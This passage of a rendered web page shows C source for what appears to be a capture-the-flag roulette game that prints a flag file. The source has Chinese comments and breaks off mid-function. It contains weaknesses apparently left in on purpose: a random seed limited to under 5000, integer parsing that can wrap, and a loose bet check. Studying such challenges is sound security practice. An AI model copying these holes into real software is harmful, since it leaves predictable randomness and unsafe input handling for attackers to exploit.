</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-175><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-175>175</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-176><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-176>176</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-177><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-177>177</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-178><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-178>178</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-179><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-179>179</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-180><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-180>180</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-181><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-181>181</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-182><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-182>182</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-183><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-183>183</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-184><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-184>184</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-185><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-185>185</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-186><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-186>186</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-187><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-187>187</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-188><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-188>188</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-189><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-189>189</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-190><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-190>190</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-191><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-191>191</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-192><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-192>192</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-193><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-193>193</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-194><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-194>194</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-195><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-195>195</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-196><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-196>196</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-197><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-197>197</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-198><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-198>198</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-199><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-199>199</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-200><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-200>200</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-201><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-201>201</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-202><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-202>202</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-203><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-203>203</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-204><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-204>204</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-205><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-205>205</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-206><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-206>206</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-207><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-207>207</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-208><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-208>208</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-209><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-209>209</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-210><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-210>210</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-211><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-211>211</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-212><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-212>212</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-213><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-213>213</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-214><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-214>214</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-215><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-215>215</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-216><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-216>216</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-217><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-217>217</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-218><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-218>218</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-219><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-219>219</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-220><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-220>220</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-221><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-221>221</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-222><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-222>222</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdint.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;time.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;limits.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define MAX_NUM_LEN 12
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define HOTSTREAK 3
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define MAX_WINS 16
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define ONE_BILLION 1000000000
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define ROULETTE_SIZE 36
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define ROULETTE_SPINS 128
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define ROULETTE_SLOWS 16
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define NUM_WIN_MSGS 10
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define NUM_LOSE_MSGS 5
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>long</span> cash <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>long</span> wins <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>//判断字符是否是数字,是则返回真。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>is_digit</span>(<span style=color:#66d9ef>char</span> c) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>&lt;=</span> c <span style=color:#f92672>&amp;&amp;</span> c <span style=color:#f92672>&lt;=</span> <span style=color:#e6db74>&#39;9&#39;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>//从stdin获取一个长整型正数，最大为LONG_MAX，以换行结尾。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>long</span> <span style=color:#a6e22e>get_long</span>() {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;&gt; &#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint64_t</span> l <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> c <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>is_digit</span>(c))
</span></span><span style=display:flex><span>      c <span style=color:#f92672>=</span> <span style=color:#a6e22e>getchar</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span>(<span style=color:#a6e22e>is_digit</span>(c)) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span>(l <span style=color:#f92672>&gt;=</span> LONG_MAX) {
</span></span><span style=display:flex><span>	l <span style=color:#f92672>=</span> LONG_MAX;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      l <span style=color:#f92672>*=</span> <span style=color:#ae81ff>10</span>;
</span></span><span style=display:flex><span>      l <span style=color:#f92672>+=</span> c <span style=color:#f92672>-</span> <span style=color:#e6db74>&#39;0&#39;</span>;
</span></span><span style=display:flex><span>      c <span style=color:#f92672>=</span> <span style=color:#a6e22e>getchar</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span>(c <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;\n&#39;</span>)
</span></span><span style=display:flex><span>      c <span style=color:#f92672>=</span> <span style=color:#a6e22e>getchar</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> l;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>//随机返回一个小于5000的正整数
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>long</span> <span style=color:#a6e22e>get_rand</span>() {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> seed;
</span></span><span style=display:flex><span>  FILE <span style=color:#f92672>*</span>f <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;/dev/urandom&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fread</span>(<span style=color:#f92672>&amp;</span>seed, <span style=color:#66d9ef>sizeof</span>(seed), <span style=color:#ae81ff>1</span>, f);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fclose</span>(f);
</span></span><span style=display:flex><span>  seed <span style=color:#f92672>=</span> seed <span style=color:#f92672>%</span> <span style=color:#ae81ff>5000</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (seed <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) seed <span style=color:#f92672>=</span> seed <span style=color:#f92672>*</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>srand</span>(seed);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> seed;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>//打印当前资金和获胜次数，下注。（输入点一）
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>long</span> <span style=color:#a6e22e>get_bet</span>() {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span>(<span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;How much will you wager?&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Current Balance: $%lu </span><span style=color:#ae81ff>\t</span><span style=color:#e6db74> Current Wins: %lu</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, cash, wins); 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>long</span> bet <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_long</span>(); 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(bet <span style=color:#f92672>&lt;=</span> cash) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> bet;
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;You can&#39;t bet more than you have!&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>//选择下注目标1~36.（输入点二）
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>long</span> <span style=color:#a6e22e>get_choice</span>() {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span> (<span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Choose a number (1-%d)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, ROULETTE_SIZE);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>long</span> choice <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_long</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;=</span> choice <span style=color:#f92672>&amp;&amp;</span> choice <span style=color:#f92672>&lt;=</span> ROULETTE_SIZE) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> choice;
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Please enter a valid choice.&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>//打印flag
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>print_flag</span>() {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> flag[<span style=color:#ae81ff>48</span>];
</span></span><span style=display:flex><span>  FILE <span style=color:#f92672>*</span>file;
</span></span><span style=display:flex><span>  file <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;flag.txt&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (file <span style=color:#f92672>==</span> NULL) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Failed to open the flag file</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fgets</span>(flag, <span style=color:#66d9ef>sizeof</span>(flag), file);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, flag);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>//一些输赢后的提示语
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>win_msgs[NUM_WIN_MSGS] <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;Wow.. Nice One!&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;You chose correct!&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;Winner!&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;Wow, you won!&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;Alright, now you&#39;re cooking!&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;Darn.. Here you go&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;Darn, you got it right.&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;You.. win.. this round...&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;Congrats!&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;You&#39;re not cheating are you?&#34;</span>,
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>lose_msgs1[NUM_LOSE_MSGS] <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;WRONG&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;Nice try..&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;YOU LOSE&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;Not this time..&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;Better luck next time...&#34;</span>
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>lose_msgs2[NUM_LOSE_MSGS] <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;Just give up!&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;It&#39;s over for you.&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;Stop wasting your time.&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;You&#39;re never gonna win&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;If you keep it up, maybe you&#39;ll get the flag in 100000000000 years&#34;</span>
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span><span style=color:#75715e>//模拟转盘效果
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>spin_roulette</span>(<span style=color:#66d9ef>long</span> spin) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> n;
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Roulette  :  &#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> i, j;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> s <span style=color:#f92672>=</span> <span style=color:#ae81ff>12500</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> ROULETTE_SPINS; i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>    n <span style=color:#f92672>=</span> <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;%d&#34;</span>, (i<span style=color:#f92672>%</span>ROULETTE_SIZE)<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>usleep</span>(s);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; j <span style=color:#f92672>&lt;</span> n; j<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\b</span><span style=color:#e6db74> </span><span style=color:#ae81ff>\b</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (i <span style=color:#f92672>=</span> ROULETTE_SPINS; i <span style=color:#f92672>&lt;</span> (ROULETTE_SPINS<span style=color:#f92672>+</span>ROULETTE_SIZE); i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>    n <span style=color:#f92672>=</span> <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;%d&#34;</span>, (i<span style=color:#f92672>%</span>ROULETTE_SIZE)<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (((i<span style=color:#f92672>%</span>ROULETTE_SIZE)<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>) <span style=color:#f92672>==</span> spin) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>for</span> (j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; j <span style=color:#f92672>&lt;</span> n; j<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\b</span><span style=color:#e6db74> </span><span style=color:#ae81ff>\b</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>usleep</span>(s);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; j <span style=color:#f92672>&lt;</span> n; j<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\b</span><span style=color:#e6db74> </span><span style=color:#ae81ff>\b</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> k <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; k <span style=color:#f92672>&lt;</span> ROULETTE_SIZE; k<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>    n <span style=color:#f92672>=</span> <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;%d&#34;</span>, ((i<span style=color:#f92672>+</span>k)<span style=color:#f92672>%</span>ROULETTE_SIZE)<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    s <span style=color:#f92672>=</span> <span style=color:#ae81ff>1.1</span><span style=color:#f92672>*</span>s;
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>usleep</span>(s);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; j <span style=color:#f92672>&lt;</span> n; j<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\b</span><span style=color:#e6db74> </span><span style=color:#ae81ff>\b</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;%ld&#34;</span>, spin);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>usleep</span>(s);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>//生成一个随机数，如果和choice一样，就给cash加双倍bet。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>play_roulette</span>(<span style=color:#66d9ef>long</span> choice, <span style=color:#66d9ef>long</span> bet) {
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Spinning the Roulette for a chance to win $%lu!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>2</span><span style=color:#f92672>*</span>bet);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> spin <span style=color:#f92672>=</span> (<span style=color:#a6e22e>rand</span>() <span style=color:#f92672>%</span> ROULETTE_SIZE)<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>;
